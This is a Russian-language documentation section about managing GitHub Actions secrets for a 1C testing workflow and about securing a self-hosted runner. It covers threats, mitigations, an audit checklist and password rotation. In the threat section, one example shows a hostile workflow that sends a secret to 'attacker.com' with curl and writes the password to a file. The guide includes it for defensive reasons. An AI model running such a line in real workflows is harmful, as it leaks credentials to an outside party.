# 41.4 Secrets и безопасность

Управление credentials для CI workflow и security considerations для self-hosted runner.

## Required secrets

Workflow `ci.yml` использует 2 secrets:

| Secret | Назначение | Тип | Пример value |
|--------|------------|-----|--------------|
| `USER_1C_LOGIN` | Логин пользователя 1С для подключения к test infobase | String | `TestUser` |
| `USER_1C_PASS` | Пароль пользователя 1С | String | `SecurePass123` |

## Optional secrets

| Secret | Назначение | Когда нужен |
|--------|------------|-------------|
| `SONAR_TOKEN` | SonarQube authentication для upload bsl-report | Если используете SonarQube как dashboard |

## Setup secrets в GitHub

### Через GitHub UI

1. Перейти в submodule repo: `https://github.com/Alex1980Alex/IBTransportManagementDevelop-Configuration`
2. **Settings** (требует admin доступ)
3. **Secrets and variables** → **Actions**
4. **New repository secret**
5. Name: `USER_1C_LOGIN`, Value: `<your_login>`, **Add secret**
6. Повторить для `USER_1C_PASS`

### Через GitHub CLI (быстрее)

```bash
gh secret set USER_1C_LOGIN --repo Alex1980Alex/IBTransportManagementDevelop-Configuration
# (введёт интерактивно value)

gh secret set USER_1C_PASS --repo Alex1980Alex/IBTransportManagementDevelop-Configuration
# (введёт интерактивно value)

# Verify
gh secret list --repo Alex1980Alex/IBTransportManagementDevelop-Configuration
```

Output должен показать:

```
NAME            UPDATED
USER_1C_LOGIN   less than a minute ago
USER_1C_PASS    less than a minute ago
```

## Как secrets passed в workflow

В `.github/workflows/ci.yml`:

```yaml
    - name: Run YAxUnit
      shell: pwsh
      env:
        USER_1C: ${{ secrets.USER_1C_LOGIN }}
        PASS_1C: ${{ secrets.USER_1C_PASS }}
      run: |
        & "${{ env.VRUNNER_PATH }}" `
          --db-user "$env:USER_1C" `
          --db-pwd "$env:PASS_1C"
```

- Secrets подставляются в **env vars** job step (не в `run:` напрямую — иначе они могут попасть в logs)
- В PowerShell обращение через `$env:USER_1C`
- GitHub автоматически **маскирует** secret values в логах (показывает `***`)

## Security best practices

### ✅ Что делать

| Practice | Описание |
|----------|----------|
| **Dedicated test user 1С** | Создать отдельного пользователя для CI с ограниченными правами (только тестовая ИБ, NO production access) |
| **Rotate secrets** | Менять пароли каждые 90 дней. `gh secret set` overwrites старое значение |
| **Принцип наименьших прав** | Test user должен иметь права ТОЛЬКО на test infobase, NO admin/configurator |
| **Audit logs** | GitHub Actions runs показывают кто triggered + когда. SEcret access НЕ логируется отдельно |
| **Environment scoping** | Для prod secrets — использовать GitHub Environments с required reviewers |
| **Repo visibility** | Если repo public — secrets всё равно безопасны (только workflow jobs могут читать) |

### ❌ Что НЕ делать

| Anti-pattern | Почему плохо | Что вместо |
|--------------|--------------|-----------|
| Hard-code пароль в ci.yml | Утечёт в git history | Использовать `secrets.*` |
| Commit `.env` файл с creds | Файл навсегда в git | `.gitignore` + secrets manager |
| `echo $PASS_1C` в run: | Потенциально попадёт в логи | GitHub маскирует, но избегать |
| Использовать prod user 1С | CI compromise = prod compromise | Dedicated test user |
| Дать write access всем contrib | Любой PR может modify workflow + steal secrets | Branch protection + required reviews для `.github/workflows/` |

## Self-hosted runner security

Self-hosted runner runs **arbitrary code** из PR workflow. Это уязвимо к:

### Threat: malicious PR modifies workflow

Если злоумышленник может опубликовать PR с modified `ci.yml`, его код запустится на ВАШЕМ ПК с доступом к:
- Всем файлам runner machine
- Network доступу runner machine
- Secrets из repo

**Mitigation:**

1. **Branch protection** (Settings → Branches → Add rule for `master`):
   - Require PR review
   - Require status checks
   - Restrict who can push

2. **Workflow approval** (Settings → Actions → General):
   - Fork pull request workflows from outside collaborators
   - **"Require approval for first-time contributors"** — обязательно ✅

3. **Codeowners для `.github/`** (`.github/CODEOWNERS`):
   ```
   .github/workflows/  @Alex1980Alex
   ```
   Изменения в workflow требуют review от вас.

### Threat: secrets leak через job output

Workflow может пытаться экспортировать secrets:
```yaml
run: |
  echo "PASS_1C=${PASS_1C}" > leak.txt  # маскируется в логах, но файл создан
  curl http://attacker.com -d "${{ secrets.USER_1C_PASS }}"  # CRITICAL!
```

**Mitigation:**

- Code review workflow changes (все changes в `.github/workflows/`)
- Network egress restrictions на runner machine (firewall)
- Secret scanning в repo (GitHub auto-detects committed secrets)

### Threat: runner compromise

Если ПК с runner скомпрометирован:
- Все past run artifacts accessible
- Cached credentials в `_work/` директории
- Network access как runner user

**Mitigation:**

- Регулярно `actions-runner update`
- Уроки firewall: разрешить только outbound к GitHub API + 1С server
- Запускать runner под dedicated user (не Administrator)
- Не использовать ПК с runner для personal stuff

## Audit checklist

После настройки runner и secrets:

- [ ] `gh secret list` показывает `USER_1C_LOGIN` + `USER_1C_PASS`
- [ ] Test PR в submodule triggers workflow, jobs pickup runner
- [ ] Runner logs (C:\actions-runner\_diag) НЕ содержат plaintext secrets
- [ ] Job output в GitHub UI показывает `***` для secrets
- [ ] Test user 1С НЕ имеет admin rights на test infobase
- [ ] Test user 1С НЕ может access production infobase
- [ ] `.github/CODEOWNERS` ограничивает кто может modify workflow
- [ ] Branch protection enabled на master/main
- [ ] Repo Actions settings: "Require approval for first-time contributors" ON
- [ ] Secrets rotation запланирована (каждые 90 дней)

## Rotation procedure

Каждые 90 дней:

```bash
# 1. Изменить пароль 1С пользователя в test infobase (через Configurator)

# 2. Update GitHub secret
gh secret set USER_1C_PASS --repo Alex1980Alex/IBTransportManagementDevelop-Configuration

# 3. Trigger test workflow для verify
gh workflow run ci.yml --repo Alex1980Alex/IBTransportManagementDevelop-Configuration --ref master

# 4. Check Actions tab — должен PASS
```
